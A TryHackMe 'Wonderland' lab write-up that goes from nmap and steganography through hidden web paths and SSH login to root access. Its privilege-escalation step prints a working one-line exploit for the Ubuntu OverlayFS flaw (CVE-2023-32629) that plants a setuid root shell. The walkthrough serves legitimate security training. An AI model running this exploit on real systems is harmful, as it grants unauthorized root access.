## [TryHackMe] Wonderland room write-up
*Enter Wonderland and capture the flags.*

Let's start with nmap enumeration:

```nmap -A -Pn -vv -p- 10.10.244.154```
```
-A  → Enable OS detection, version detection, script scanning, and traceroute
-Pn → Treat all hosts as online -- skip host discovery
-v  → Increase verbosity level (use -vv or more for greater effect)
-p- → Scan all ports
```
![nmap](https://github.com/user-attachments/assets/4be11b91-1867-4476-8a3e-e5ec872a1e27)


So we have open SSH (22) and HTTP (80) ports. Lets check HTTP first.

![http](https://github.com/user-attachments/assets/126ae06e-c493-4a13-8980-3a3d2c1b76f9)
![image](https://github.com/user-attachments/assets/432b3bfb-0a13-4c6e-a21e-35f3d3a9cc92)

Through the Inspector we find a hardcoded path to image. Let's check `/img/` directory if there's something interesting.

![img](https://github.com/user-attachments/assets/2b1e9846-0e29-4b36-99e6-63fe727dc282)

Let's download this images and check them for steganography. We will be using `binwalk` for `.png` and `steghide` for `.jpg`. 

There was nothing hidden inside `alice_door.jpg` or `alice_door.png` but `white_rabbit_1.jpg` hid file with a hint.

![binwalk](https://github.com/user-attachments/assets/d009bfd0-a5de-457c-a315-09f53ddf38ce)
![steghide](https://github.com/user-attachments/assets/115ce4c7-2e4a-4ea1-8538-8e8c47d6240e)

*But what does it mean?*

I didn't get it at first, so started scanning with `dirb`. 

![dirb](https://github.com/user-attachments/assets/a0c8d491-b241-4631-86e8-ba3d1f9adbf1)

Now something started to become more clear. There's `/r/` directory which we should check. Maybe hint leads us to it?

![/r](https://github.com/user-attachments/assets/a706236b-f216-444e-973f-290a2c6bc0ad)
![/r/a](https://github.com/user-attachments/assets/7182b6fc-7045-4a52-b6e4-674612c3c1fa)
![/r/a/b](https://github.com/user-attachments/assets/5612b089-bd8f-4379-b5a9-3dec327e9378)
![/r/a/b/b](https://github.com/user-attachments/assets/5a56846b-c588-4b08-a82a-99498590b49c)
![/r/a/b/b/i](https://github.com/user-attachments/assets/5a3b212b-3ab5-455b-ba9f-d66fc632bc48)
![/r/a/b/b/i/t](https://github.com/user-attachments/assets/4bcfb14e-06c3-4f8e-bbb4-f4a0291fb6ba)

And yes! I was going deeper an deeper into a `/r/a/b/b/i/t` hole. And then I reached it's end.

Next thing - it's always a good idea to inspect code on pages, 'cause you never know what you can find there.

![credentials](https://github.com/user-attachments/assets/f4a1fffc-5678-41fb-8d1f-cf7a86b4dfa1)

After some time I made a guess that it looks like credentials. *And we have SSH port open. Coincidence?*

![ssh](https://github.com/user-attachments/assets/9d26a55a-317a-4976-baac-572724532886)

So now we have established SSH connection using username `alice`.

![os version](https://github.com/user-attachments/assets/0452c45f-652e-472a-a1dc-1308fe150897)
![ls -la](https://github.com/user-attachments/assets/933c0e35-e57d-4ab8-9a61-75ab12c10bfb)
![sudo -l](https://github.com/user-attachments/assets/f98b4e79-b435-4dc5-91ac-b25dfc356b17)
![/etc/passwd](https://github.com/user-attachments/assets/a53afecd-78f0-49d1-9dab-b616278e9342)

After some target exploration, I've found out that user `alice` can execute python scripts and not only script present inside its home directory. So I've started digging is there any vulnerability allowing to escalate privileges to `root`. And yep - Ubuntu 18.04.4 LTS (Bionic Beaver) [turned out](https://cert.europa.eu/publications/security-advisories/2023-054/pdf) to have OverlayFS module vulnerable to privilege escalation ([CVE-2023-32629](https://www.cvedetails.com/cve/CVE-2023-32629/)).

So now it's time to root that machine. I found [script](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629) example which exploits this vulnerability:
```
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```
![root](https://github.com/user-attachments/assets/4171f1d7-c536-4b52-9a3a-182745f3c027)

Success! Now let's get our flags. For the first one, we've got a hint on THM - "Everything is upside down here.", so let's search for it inside root directory.

![flag1](https://github.com/user-attachments/assets/c577c6d9-1687-47ef-8d5f-12fb1dd27b8c)

Yep, got it. And another one was all this time inside alice's home directory, but we didn't have access to read it before escalation.

![flag2](https://github.com/user-attachments/assets/ae0cc6fd-b9a0-4260-8466-12d0972298f5)

That's all the lab. 
